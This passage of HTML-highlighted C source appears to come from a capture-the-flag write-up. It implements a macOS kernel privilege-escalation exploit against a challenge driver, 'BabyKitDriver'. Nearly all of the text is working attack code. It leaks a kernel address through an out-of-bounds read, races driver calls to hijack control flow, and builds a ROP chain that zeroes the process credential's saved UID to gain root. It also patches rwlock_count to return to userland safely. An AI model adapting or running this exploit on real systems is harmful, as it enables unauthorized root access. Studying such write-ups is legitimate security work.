</span></span></span><span class="line"><span class="cl"><span class="cp">#define proc_ucred slide+0xFFFFFF80008556B0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pmap_ro_zone_atomic_op slide+0xFFFFFF80004B0410
</span></span></span><span class="line"><span class="cl"><span class="cp">#define thread_exception_return slide+0xFFFFFF8000334DCA
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Debugging purposes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define debug_gadget 0xffffff800033620a+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define addr_save_loc 0xFFFFFF8000C18000+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define eb_fe 0xFFFFFF800037E726+slide
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Helper method during debugging
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">print_data</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;-----&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">fmt_str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">fmt_str</span> <span class="o">=</span> <span class="s">&#34;0x%04x: 0x%016lx&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">fmt_str</span> <span class="o">=</span> <span class="s">&#34; 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;-----&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">GetKextAddr</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">fp</span> <span class="o">=</span> <span class="nf">popen</span><span class="p">(</span><span class="s">&#34;kextstat 2&gt;/dev/null | grep BabyKitDriver | awk &#39;{print $3}&#39;&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to get KEXT address!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint64_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="nf">strtoul</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">baby_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">size</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOConnectCallScalarMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span><span class="n">kBabyRead</span><span class="p">,(</span><span class="k">const</span> <span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">leave_message</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">msg_type</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">args</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">msg_type</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">size</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOConnectCallScalarMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span><span class="n">kLeaveMessage</span><span class="p">,(</span><span class="k">const</span> <span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">babyKitConnect</span><span class="p">(</span><span class="kt">io_connect_t</span> <span class="o">*</span><span class="n">connection</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">kern_return_t</span>   <span class="n">kr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">io_service_t</span>    <span class="n">serviceObject</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">io_iterator_t</span>   <span class="n">iterator</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">CFDictionaryRef</span> <span class="n">classToMatch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">classToMatch</span> <span class="o">=</span> <span class="nf">IOServiceMatching</span><span class="p">(</span><span class="n">kIOKitClassName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">classToMatch</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceMatching returned a NULL dictionary</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">serviceObject</span> <span class="o">=</span> <span class="nf">IOServiceGetMatchingService</span><span class="p">(</span><span class="n">kIOMainPortDefault</span><span class="p">,</span> <span class="n">classToMatch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">MACH_PORT_VALID</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceGetMatchingService failed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">kr</span> <span class="o">=</span> <span class="nf">IOServiceOpen</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">,</span> <span class="nf">mach_task_self</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">connection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">IOObjectRelease</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceOpen returned %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="nf">race</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">loop_end</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">leave_message</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ropChain</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">    Without fork, when we return from the kernel to userland, it will killed
</span></span></span><span class="line"><span class="cl"><span class="cm">    the process. We need to fork() first in the beginning, so that parent and child
</span></span></span><span class="line"><span class="cl"><span class="cm">    have shared cred.
</span></span></span><span class="line"><span class="cl"><span class="cm">    - Child process will do the exploit, which will overwrite the cr_svuid to 0 (which will be killed).
</span></span></span><span class="line"><span class="cl"><span class="cm">    - Parent process will sleep first, waiting until the child process overwrite the shared cred struct svuid to 0,
</span></span></span><span class="line"><span class="cl"><span class="cm">      then do seteuid(0), setuid(0), setgid(0) so that it will become root.
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">      Setup connection
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">babyKitConnect</span><span class="p">(</span><span class="o">&amp;</span><span class="n">connection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">      Get leak with the first bug (setting size to 0 will trigger OOB read)
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">leave_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">baby_read</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">leaked</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mh">0x318</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">kext_base</span> <span class="o">=</span> <span class="n">leaked</span> <span class="o">-</span> <span class="mh">0x1808</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">slide</span> <span class="o">=</span> <span class="n">kext_base</span> <span class="o">-</span> <span class="nf">GetKextAddr</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0xdc000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">kbase</span> <span class="o">=</span> <span class="n">KERNEL_BASE_NO_SLID</span> <span class="o">+</span> <span class="n">slide</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kext Base       : 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kext_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kernel Text Base: 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kernel Slide    : 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">slide</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// getchar();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">      Build our ROP Chain
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">chain</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">chain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Start at chunk+0x8 in driver. When the race is triggered,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// chunk+0x8 will be called, which will pivot the stack to this
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// chunk and do ROP Chain.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">push_rcx_jmp_qword_ptr_rsi_plus_0x66</span><span class="p">;</span> <span class="c1">// rsi+0x66 will contains gadget to pivot stack to this heap chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// chunk+0x10 won&#39;t be used
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Our ROP will start here after stack pivot with pop rsp; pop r13; pop r14; pop r15;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// , where popped rsp value will be chunk+0x0, so the ROP chain will start at chunk+0x18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// We will try to perform
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pmap_ro_zone_atomic_op(ZONE_ID_KAUTH_CRED, proc_ucred(current_proc()), 0x20, ZRO_ATOMIC_AND_32, 0);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// , which will update the cred-&gt;cr_svuid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">current_proc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">proc_ucred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_rdi_rax_pop_rbp_jmp_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// We will continue the ROP Chain at 0x80 just for convenience
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Need to do this because:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - rsi points to chunk+0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - there will be jmp qword ptr [rsi+0x66], which mean we need to put
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//   gadget in chunk+0x76 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// So what we do here is we reserve 0x10 bytes starting from chunk+0x70
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_r14_r15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Overwrite chunk+0x76 to pivot stack gadget
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">chunk_0x76</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x76</span> <span class="o">-</span> <span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chunk_0x76</span> <span class="o">=</span> <span class="n">pop_rsp_r13_r14_r15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Continue ROPChain
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// // Debugging purposes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// *chain++ = pop_rcx;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// *chain++ = addr_save_loc;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// *chain++ = mov_qword_rcx_rax_pop_rbp;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// *chain++ = 0x4141414141414141;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="c1">// rax still contains the ucred (returned from proc_ucred)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Set rsi to ucred
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_rsi_rax_spoil_rax_pop_rbp_ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Set rdi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>   <span class="c1">// ZONE_ID_KAUTH_CRED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Set rdx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rdx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Set rcx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x34</span><span class="p">;</span>    <span class="c1">// ZRO_ATOMIC_AND_32
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Set r8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_r8_eax_spoil</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Call pmap_ro_zone_atomic_op
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pmap_ro_zone_atomic_op</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// // Debugging purposes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// *chain++ = eb_fe;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Now, during working on this challenge, we found out that we
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// couldn&#39;t return to userland because there is panic due to rwlock_count is 1.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// We will overwrite it to 0 before return to userland.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">current_thread</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_rsi_rax_spoil_rax_pop_rbp_ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x44C</span><span class="p">;</span>   <span class="c1">// offset for rwlock_count
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="c1">// Points rsi to rwlock_count
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">add_rsi_rcx_mov_rax_rsi_pop_rbp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_r8_eax_spoil</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Overwrite rwlock_count to 0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_dword_ptr_rsi_r8d_pop_rbp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Return to userland
